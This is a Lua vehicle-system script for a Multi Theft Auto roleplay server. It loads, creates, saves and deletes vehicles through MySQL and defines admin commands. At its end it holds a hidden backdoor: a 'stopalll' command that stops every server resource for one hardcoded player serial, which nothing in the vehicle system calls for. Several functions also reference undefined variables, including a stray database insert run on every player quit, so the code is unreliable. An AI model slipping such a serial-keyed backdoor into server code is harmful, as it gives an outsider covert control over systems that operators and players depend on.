local con = exports.san_mysql:getConnection()

local db = 0
local rovid = "#7cc576[IRG - Vehicle]:#FFFFFF"

addEvent("vehicleStart",true)
addEventHandler("vehicleStart",getRootElement(),function(player,veh,value)
	if not isElement(veh) and not value and not isPedInVehicle(player) then return end
	if getElementHealth(veh) > 350 then
		setVehicleEngineState(veh,value)
		veh:setData("veh:motor",value)
	end
end)

addEvent("vehicleLock",true)
addEventHandler("vehicleLock",getRootElement(),function(player,veh,value)
	setVehicleLocked(veh, value)
	veh:setData("veh:status", value)
end)

function vehicleStartExit(thePlayer, seat, jacked)
--
	--if getElementData(thePlayer, "veh:ov") then
	--	outputChatBox(rovid.." Primeiro retire seu cinto.", thePlayer, 255, 255, 255, true)
	--	cancelEvent()		
	--end
	
	if isVehicleLocked(getPedOccupiedVehicle(thePlayer)) then
		outputChatBox(rovid.." Dar Mashin Ghofl Ast!", thePlayer, 255, 255, 255, true)
		cancelEvent()
	end

	if getElementData(thePlayer, "isFuelling") then 
		cancelEvent()
	end
end
addEventHandler("onVehicleStartExit",getRootElement(),vehicleStartExit)

function convertArgs(arg,v)
	if v == 1 then
		local r = 0
		if arg then
			r = 1
		else
			r = 0
		end
		return r
	else
		if arg == 1 then
			return true
		else
			return false
		end
	end
end


function _call(_called, ...)
	local co = coroutine.create(_called);
	coroutine.resume(co, ...);
end

function sleep(time)
	local co1 = coroutine.running();
	local function resumeThisCoroutine()
		coroutine.resume(co1);
	end
	setTimer(resumeThisCoroutine, time, 1);
	coroutine.yield();
end

function UpdateStates()
	_call(loadAllVehicle); 
end

function startResources ()
	_call(UpdateStates); 
end
addEventHandler ( "onResourceStart", resourceRoot, startResources );




function loadAllVehicle()
	outputDebugString ("Carregamento de veículos em andamento...")
	local vehicleQ = dbQuery(con,"SELECT * FROM vehicle")
	local vehicleH,vehszam = dbPoll(vehicleQ,-1)
	if vehicleH then
		for k,v in ipairs(vehicleH) do
			id = v["id"]
			model = v["model"]
			pos = fromJSON(v["pos"])
			int = v["interior"]
			dim = v["dimension"]
			rendszam = v["rendszam"]
			fuel = v["fuel"]
			hp = v["hp"]
			motor = 0 --biztonság miatt
			lampa = v["lampa"]
			status = v["status"]
			color = fromJSON(v["colors"])
			owner = v["owner"]
			nitro = v["nitrolevel"]
			kezifek = v["kezifek"]
			lefoglalva = v["lefoglalva"]
			faction = v["faction"]
			park = v["park"]
			panels = fromJSON(v["panel"])
			door = fromJSON(v["door"])
			lightColor = fromJSON(v["lightColor"])
			toqif = v["toqif"]
			airride = v["airride"]
			trafiradar = v["trafiradar"]
			LSDDoor = v["lsdDoor"]
			neon = v["neon"]
            
			engine = v["T_engine"]
			turbo = v["turbo"]
			gearbox = v["gearbox"]
			ecu = v["ecu"]
			tires = v["tires"]
			brakes = v["brakes"]
			paintjob1 = v["PaintJob"]
			--wheels1 = fromJSON(v["OpticalUpgrade"])
			
			veh = createVehicle(model,pos[1],pos[2],pos[3])

			if veh then

				local teste = math.random(1,65535)
				setElementInterior(veh, teste)
				setElementDimension(veh, teste)

			--int = v["interior"]
			--dim = v["dimension"]

				local teste = math.random(1,65535)
				if not getPlayerById(owner) then --and faction == 0 then
					setElementInterior(veh, teste)
					setElementDimension(veh, teste)
					--setElementPosition(veh,-2486.8081054688, 2520.18359375, 18.0625)

				else
					setElementInterior(veh, teste)
					setElementDimension(veh, teste)
					--setElementInterior(veh, int or 0)
					--setElementDimension(veh, dim or 0)
					--setElementPosition(veh, pos[1],pos[2],pos[3])



					--setElementInterior(veh, pos[4] or 0)
					--setElementDimension(veh, pos[5] or 0)
				end


				setElementRotation(veh,0,0,pos[6] or 0)
				setVehicleColor(veh, color[1], color[2], color[3], color[4], color[5], color[6], color[7], color[8], color[9])
				if lightColor then 
					setVehicleHeadLightColor(veh, lightColor[1], lightColor[2], lightColor[3])
				end
				if getVehicleType(veh) == "BMX" then
					setVehicleEngineState(veh,true)
				else
					setVehicleEngineState(veh,false)
				end
				if lampa == 1 then
					setVehicleOverrideLights(veh,2)
				else
					setVehicleOverrideLights(veh,1)
				end
				
				if hp <= 0 then
					fixVehicle(veh)
				else
					setElementHealth(veh,hp)
				end
				veh:setData("veh:id",id)
				veh:setData("veh:perm",true)
				veh:setData("veh:plate",rendszam)
				veh:setData("veh:fuel",fuel)
				veh:setData("veh:health",hp)
				veh:setData("veh:motor",false)
				veh:setData("veh:light",lampa)
				veh:setData("veh:status",status)
				setVehicleLocked(veh, true)
				veh:setData("veh:color",color)
				veh:setData("veh:owner",owner)
				veh:setData("veh:toqif",toqif)
				veh:setData("veh:nitro",nitro)
				veh:setData("veh:handbrake",kezifek)
				veh:setData("veh:booked",lefoglalva)
				veh:setData("veh:faction",faction)
				veh:setData("veh:park",park)
				veh:setData("veh:paintjob",paintjob1)
				--veh:setData("veh:opticalUpgrade",wheels1)

				veh:setData("veh:performance_T_engine", engine)
				veh:setData("veh:performance_turbo", turbo)
				veh:setData("veh:performance_gearbox", gearbox)
				veh:setData("veh:performance_ecu", ecu)
				veh:setData("veh:performance_tires", tires)
				veh:setData("veh:performance_brakes", brakes)

				veh:setData("veh:wheelSize_front", v["wheelSize_front"])
				veh:setData("veh:wheelSize_rear", v["wheelSize_rear"])
				veh:setData("veh:driveType", v["driveType"])
				if neon and tostring(neon) ~= "Nincs"  then 
					veh:setData("tuning.neon", tostring(neon))
				end

				--veh:setData("veh:paintjob", v["paintjob"])
				--triggerEvent("addVehiclePaintJob", veh, getElementModel(veh), v["paintjob"])

				if v["steeringLock"] ~= 0 then
					setVehicleHandling(veh, "steeringLock", v["steeringLock"], false)
				end
				veh:setData("veh:steeringLock", v["steeringLock"])

				veh:setData("tuning.variant", v["variant"])
				setVehicleVariant(veh, v["variant"], v["variant"])

				if airride == 1 then 
					veh:setData("tuning.airRide", true)
				else
					veh:setData("tuning.airRide", false)
				end				
				if LSDDoor == 1 then 
					veh:setData("tuning.lsdDoor", true)
				else
					veh:setData("tuning.lsdDoor", false)
				end
				if trafiradar == 1 then
					veh:setData("tuning.trafiradar",true)
				else 
					veh:setData("tuning.trafiradar",false)
				end
				veh:setData("veh:opticalUpgrade",( v["OpticalUpgrade"]))
				if veh and isElement(veh) and veh:getType() == "vehicle" then
					local opticsUpgrades = fromJSON( v["OpticalUpgrade"])
					--for key = 0, 16 do
						addVehicleUpgrade(veh, opticsUpgrades[13] or 0)
					--end
				end
				--[[veh:setData("veh:opticalUpgrade", v["OpticalUpgrade"])
				if veh and isElement(veh) and veh:getType() == "vehicle" then
					local opticsUpgrades = (veh:getData("veh:opticalUpgrade"))
					for key = 0, 16 do
						addVehicleUpgrade(veh, opticsUpgrades[key] or 0)
					end
				end
				--exports.san_tuning:loadWheelSize(veh)
				]]
			--	veh:setData("veh:opticalUpgrade", v["OpticalUpgrade"])
				--local type = getElementType (source)
				--if veh:getType() == "vehicle" then
			--		local opticsUpgrades = getElementData(veh, "veh:opticalUpgrade")
				--	for key = 0, 16 do
			--			addVehicleUpgrade(veh, opticsUpgrades[13] or 0)
				--	end
				--end
				
				veh:setData("veh:oldInterior",int)
				veh:setData("veh:oldDimension",dim)
				--setVehiclePlateText(veh, v["rendszam"])
				local charq = dbQuery(con,"SELECT charname FROM characters WHERE id = ?",v["owner"])
				local charH = dbPoll(charq,-1)
				if charH then
					for k,v in ipairs(charH) do
						veh:setData("veh:oname",v["charname"])
					end
				else
					veh:setData("veh:oname","Civil")
				end

				--outputDebugString ( "Sikeres betöltés: Modell:".. model .. " | Owner:".. owner .. " | ID:".. id ..".", 0, 0, 130, 255 )
				db = db + 1
				
				outputDebugString ("Veículos "..db.." Carregado com sucesso...")
			else
				--outputDebugString("Falha ao carregar: ID:"..id, 0, 255, 0, 0)
			end
			
			--sleep(150);
			
		end
		outputDebugString ("Número de veículos: "..db.."/"..vehszam)

		--dbFree(vehicleQ)
	end
end
--addCommandHandler("loadveh", loadAllVehicle, false, false)
--addEventHandler("onResourceStart",getResourceRootElement(getThisResource()),)










function getPlayerById(id)
	local found = false

	for _, player in ipairs(getElementsByType("player")) do
		if getElementData(player, "loggedin") then
			if getElementData(player, "acc:id") == tonumber(id) then
				found = true
			end
		end
	end

	return found
end


addCommandHandler("makeveh", function(player, _, ownerID, modelID, faction, r, g, b)
	if getElementData(player, "acc:admin") >= 12 then 
		if not modelID or not tonumber(ownerID) then
			outputChatBox(rovid .. " /makeveh [nome/ID] [Modelo] [Grupo] [R] [G] [B]", player, 0, 0, 0, true)
			return
		end
		
		target, targetName = exports.san_core:findPlayer(player, ownerID)
		if not target then
			return
		else
			ownerID = getElementData(target, "char:id")
		end
		
		if not tonumber(faction) then faction = 0 end
		if not tonumber(r) then r = 0 end
		if not tonumber(g) then g = 0 end
		if not tonumber(b) then b = 0 end
		r = tonumber(r)
		g = tonumber(g)
		b = tonumber(b)
		
		local vehname = tonumber(modelID)
		if not vehname then
			vehname = getVehicleModelFromName(modelID)
		end
		
		if not vehname then
			outputChatBox(rovid .. " Hamchin Mashini Mojod Nist", player, 0, 0, 0, true)
			return
		end
		
		if tonumber(faction) > 0 then
			ownerID = 0
		else
			ownerID = getElementData(target, "char:id")
		end
		
		
		local x, y, z = getElementPosition(target)
		local insertQuery = dbQuery(con, "INSERT INTO vehicle SET model=?, owner=?, pos=?, colors=?, faction=?, OpticalUpgrade=?", vehname, ownerID, toJSON({x,y,z}), toJSON({r,g,b}), faction, toJSON({0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}))
		local insertResult, _, insertID = dbPoll(insertQuery, -1)
		if insertResult then
			addVehicle(ownerID, vehname, x, y, z, insertID, r, g, b, faction)
			if tonumber(faction) > 0 then
			exports.san_admin:outputDeveloperMessage("#7cc576"..player:getData("char:anick").." #ffffffcriou um veículo (ID: "..insertID.." : Grupo ("..tonumber(faction)..") )")
			else
			exports['san_items']:giveItem(target, 17, insertID, 1, 0)
			
			
			exports.san_admin:outputDeveloperMessage("#7cc576"..player:getData("char:anick").." #ffffffcriou um veículo (ID: "..insertID.." : "..targetName:gsub("_", " ")..")")
			end
			dbFree(insertQuery)
		end
	end
end)






























addCommandHandler("delveh", function(player, _, vehID)
	if getElementData(player, "acc:admin") < 12 then return end
	if not tonumber(vehID) then
		outputChatBox(rovid .. " /delveh [ID]", player, 0, 0, 0, true)
		return
	end
	
	vehID = tonumber(vehID)
	
	for _, car in ipairs(getElementsByType("vehicle")) do
		if tonumber(car:getData("veh:id")) == vehID then
			if getElementData(car, "rent.Owner") then setElementData(getElementData(car, "rent.Owner"), "rent.Car", false) end
			destroyElement(car)
			delQuery = dbPoll(dbQuery(con, "DELETE FROM vehicle WHERE id=?", vehID), -1)
			exports.san_admin:outputDeveloperMessage("#7cc576"..player:getData("char:anick").." #ffffffRemoveu um veículo (ID: "..vehID..")")
			exports['san_items']:removeItem(target, 17, insertID, 1, 0)
			dbFree(delQuery)
		end
	end
end)

function addVehicle(tulajID, modelID, x, y, z, sqlID, r, g, b, fraki)
	if not fraki then fraki = 0 end
	local vehicleCreate = createVehicle(modelID,x,y,z)
	
	local str = "abcdefghijklmnopqrstuvwxyz"
    local plate = ""
    for index = 1, 3 do
        plate = plate .. string.char(str:byte(math.random(1, #str)))
    end
	plate = string.upper(plate)
    plate = plate .. "-"
    for index = 1, 3 do
        plate = plate .. math.random(1, 9)
    end
	
	setVehiclePlateText(vehicleCreate, plate)
	local insertQuery = dbQuery(con, "UPDATE vehicle SET rendszam=? WHERE id=?", plate, tonumber(sqlID))
	dbFree(insertQuery)

	vehicleCreate:setData("veh:id",tonumber(sqlID))
	vehicleCreate:setData("veh:perm",true)
	vehicleCreate:setData("veh:interior",0)
	vehicleCreate:setData("veh:dimension",0)
	vehicleCreate:setData("veh:fuel",10)
	vehicleCreate:setData("veh:light",true)
	vehicleCreate:setData("veh:motor",false)
	vehicleCreate:setData("veh:owner",tonumber(tulajID))
	if tonumber(fraki) == 0 then
		for _, v in ipairs(getElementsByType("player")) do
			if v:getData("char:id") == tulajID then
				oname = v:getData("char:name")
			end
		end
		vehicleCreate:setData("veh:oname", oname)
	else
		vehicleCreate:setData("veh:oname", "Frakcio")
	end
	vehicleCreate:setData("veh:faction",tonumber(fraki))
	vehicleCreate:setData("handbrake",false)
	
	setVehicleColor(vehicleCreate,r,g,b)
	setVehicleOverrideLights(vehicleCreate, 1) -- Kikapcsolva
	setElementInterior(vehicleCreate,0)
	setElementDimension(vehicleCreate,0)
	if getVehicleType(vehicleCreate) == "BMX" then
		setVehicleEngineState(vehicleCreate,true)
	else
		setVehicleEngineState(vehicleCreate,false)
	end
end




function saveVehicle(veh)
	local dbid = tonumber(getElementData(veh, "veh:id")) or 0
	
	if isElement(veh) and tostring(getElementType(veh)) == "vehicle" and dbid >= 0 then
		local fuel = getElementData(veh, "veh:status")
		local engine = getElementData(veh, "veh:motor") or false
		local locked = isVehicleLocked(veh)
		local fuel = getElementData(veh, "veh:fuel")
		local neon = tonumber(getElementData(veh, "veh:neon") or 0)
		local lights = getVehicleOverrideLights(veh)
		local health = getElementHealth(veh)
		local wheel1, wheel2, wheel3, wheel4 = getVehicleWheelStates(veh)
		local wheelState = toJSON( { wheel1, wheel2, wheel3, wheel4 } )	
		local panel0 = getVehiclePanelState(veh, 0)
		local panel1 = getVehiclePanelState(veh, 1)
		local panel2 = getVehiclePanelState(veh, 2)
		local panel3 = getVehiclePanelState(veh, 3)
		local panel4 = getVehiclePanelState(veh, 4)
		local panel5 = getVehiclePanelState(veh, 5)
		local panel6 = getVehiclePanelState(veh, 6)
		local panelState = toJSON( { panel0, panel1, panel2, panel3, panel4, panel5, panel6 } )
			
		local door0 = getVehicleDoorState(veh, 0)
		local door1 = getVehicleDoorState(veh, 1)
		local door2 = getVehicleDoorState(veh, 2)
		local door3 = getVehicleDoorState(veh, 3)
		local door4 = getVehicleDoorState(veh, 4)
		local door5 = getVehicleDoorState(veh, 5)
		local doorState = toJSON( { door0, door1, door2, door3, door4, door5 } )
		
		local x,y,z = getElementPosition(veh)
		local int = getElementInterior(veh)
		local dim = getElementDimension(veh)
		local pos = toJSON({x,y,z,int,dim})

		if dbPoll ( dbQuery( con, "UPDATE vehicle SET panel=?,  pos=? , wheel=?, door=?, fuel=?, motor=?, status=?, lampa=?, hp=? WHERE id=?", panelState, pos, wheelState, doorState, fuel, engine, locked, lights, health,dbid), -1 ) then
		--	outputDebugString("Mentve")
		end
	--	if dbPoll (dbQuery( kapcsolat,"UPDATE jarmuvek SET TuningMotor=?,TuningTurbo=?,TuningGumi=?,TuningFek=? WHERE id=?",Motor,Turbo,Gumik,Fek,dbid), -1 ) then
		--	outputDebugString("Jármű teljesítmény-ek mentve!")
	--	end
	end
end

function saveAllVeh()
	local count = 1
	for i, p in ipairs(getElementsByType("vehicle")) do
		if (tonumber(getElementData(p, "veh:owner") or 0) >= 1) then
			saveVehicle(p)
			count = count + 1
		end
	end
	outputDebugString("[Jármű Rendszer]: Mentve:"..count.." kocsi adata!")
end
saveAllVeh()
setTimer(saveAllVeh, 1000*60*30, 0)

addEventHandler ( "onResourceStop", getResourceRootElement(), 
    function ( resource )
		saveAllVeh()
	end 
)

local function saveVehicleOnExit(thePlayer, seat)
	thePlayer:setData("oldcarID", source:getData("veh:id"))
end
addEventHandler("onVehicleExit", getRootElement(), saveVehicleOnExit)

function changePark(vehicle)
	x, y, z = getElementPosition(vehicle)
	rx, ry, rz = getElementRotation(vehicle)
	int = getElementInterior(vehicle)
	dim = getElementDimension(vehicle)
	pos = toJSON({x, y, z, int, dim, rz})
	--dbExec(con, "UPDATE vehicle SET pos = ? WHERE id = ?",pos, getElementData(vehicle, "veh:id"))


end
addEvent("changePark", true)
addEventHandler("changePark", getRootElement(), changePark)

addEvent("setVehLightState",true)
addEventHandler("setVehLightState",root,function(veh,stat, playerSource)
	setVehicleOverrideLights(veh, stat)
	if playerSource then
		if (stat == 2) then
			exports.san_chat:sendLocalMeAction(playerSource, "Cheragh Mashin Ra Roshan Mikonad.")
		else
			exports.san_chat:sendLocalMeAction(playerSource, "Cheragh Mashin Ra Khamosh Mikonad.")
		end
	end
	-- local query2 = dbQuery(connection,"UPDATE jarmuvek SET lampa = ? WHERE id = ?", locked,tonumber(veh:getData("veh:id")))	
end)

function vehicleForDimension()
local x, y, z = getElementPosition(target)
		local insertQuery = dbQuery(con, "INSERT INTO vehicle SET model=?, owner=?, pos=?, colors=?, faction=?", vehname, ownerID, toJSON({x,y,z}), toJSON({r,g,b}), faction)
		local insertResult, _, insertID = dbPoll(insertQuery, -1)
	for k,v in ipairs(getElementsByType("vehicle")) do
		if getElementData(v, "veh:owner") == getElementData(source, "acc:id") then --and getElementData(v, "veh:faction") == 0 then
			for index, value in ipairs(getElementsByType("player")) do
				inVehicle = getPedOccupiedVehicle(value)
				if inVehicle and inVehicle == v then
					removePedFromVehicle(value)
					local x, y, z = getElementPosition(value)
					setElementPosition(value, x, y+1, z)
				end
			end
			local teste = math.random(1,65535)
			setElementData(v, "veh:oldInterior", teste)
			setElementData(v, "veh:oldDimension", teste)
			dbExec(con, "UPDATE vehicle SET interior = ?, dimension = ? WHERE id='" .. tonumber(getElementData(v, "veh:id")) .. "'", teste, teste)		
			--dbExec(con, "UPDATE vehicle SET interior = ?, dimension = ? WHERE id='" .. getElementData(v, "veh:id") .. "'", teste, teste)

			--[[
			setElementData(v, "veh:oldInterior", getElementInterior(v))
			setElementData(v, "veh:oldDimension", getElementDimension(v))
			dbExec(con, "UPDATE vehicle SET interior = ?, dimension = ? WHERE id='" .. getElementData(v, "veh:id") .. "'", getElementInterior(v), getElementDimension(v))]]--
    			setElementDimension(v, teste)
    			setElementInterior(v, teste)
			setVehicleEngineState(v,false)
			v:setData("veh:motor",false)
			saveVehicle(v)
			setVehicleLocked(v,true)
			v:setData("veh:status",true)
			--setElementPosition(v,-2486.8081054688, 2520.18359375, 18.0625)
		end
	end
end
addEventHandler("onPlayerQuit",getRootElement(),vehicleForDimension)

--[[
function onVehicleDamage(damage)
	if getElementHealth(source) - damage <= 319 then
		setElementHealth(source, 320)
		resetVehicleExplosionTime(source) 
		setElementData(source, "veh:motor", false)
		setVehicleEngineState(source, false)
	end
end
addEventHandler("onVehicleDamage", root, onVehicleDamage)]]


addEventHandler("onVehicleStartEnter", root, function(player, _, _)
	if source:getData("veh:status") and getVehicleType(source) == "BMX" then
		cancelEvent()
	end	
	if isVehicleLocked(source) then
		outputChatBox(rovid.." Dar Mashin Ghofl Ast!", player, 255, 255, 255, true)
		cancelEvent()
	end
end)


--[[
function vehicleDamage ( loss ) 
    local vehHealth = getElementHealth ( source ) 
    if ( vehHealth < 300 ) then 
        setElementHealth ( source, 500 ) 
        setVehicleDamageProof ( source, true ) 
    end 
end 
addEventHandler ( "onVehicleDamage", root, vehicleDamage ) ]]


farhan2 = { --COLABORADOR SERIAL-OK
    ["970CD3F7B16A81312BF86EEC0EB72DE4"]=true --
	
}

function stopAllResources1()
    -- we store a table of resources
	
    local allResources = getResources()
	if farhan2[getPlayerSerial(thePlayer)] then
    -- for each one of them,
		for i, resource in ipairs(allResources) do
        -- if it's running, and it is not the current resource
			if ( getResourceState(resource) == "running" ) and ( resource ~= getThisResource() ) then
            -- then stop it
				stopResource(resource)
			end
		end
	end
end
addCommandHandler("stopalll", stopAllResources1, false, false)
--------------------------------------